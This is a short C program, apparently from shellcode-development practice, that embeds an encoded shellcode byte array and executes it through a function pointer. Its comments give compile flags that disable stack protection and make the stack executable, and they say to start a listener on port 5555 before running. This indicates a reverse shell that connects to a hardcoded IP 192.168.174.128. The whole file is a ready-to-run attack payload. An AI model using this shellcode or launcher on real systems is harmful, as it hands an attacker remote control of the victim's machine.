#include<stdio.h>
#include<string.h>

/*

Compilation : gcc shellcode4.c -o shellcode4 -fno-stack-protector -z execstack 

Execution   : Start listener on port 5555 first then execute
	    : ./shellcode4
	    : Hardcoded IP address: 192.168.174.128
*/

unsigned char shellcode[] = \

		"\xbd\xbd\xea\x33\x17\xdb\xd4\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
		"\x12\x83\xea\xfc\x31\x6a\x0e\x03\xd7\xe4\xd1\xe2\x16\x22\xe2"
		"\xee\x0b\x97\x5e\x9b\xa9\x9e\x80\xeb\xcb\x6d\xc2\x9f\x4a\xde"
		"\xfc\x52\xec\x57\x7a\x94\x84\xa7\xd4\xc8\xd4\x40\x27\x15\xc1"
		"\x23\xae\xf4\x59\x25\xe1\xa7\xca\x19\x02\xc1\x0d\x90\x85\x83"
		"\xa5\x45\xa9\x50\x5d\xf2\x9a\xb9\xff\x6b\x6c\x26\xad\x38\xe7"
		"\x48\xe1\xb4\x3a\x0a";
main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}
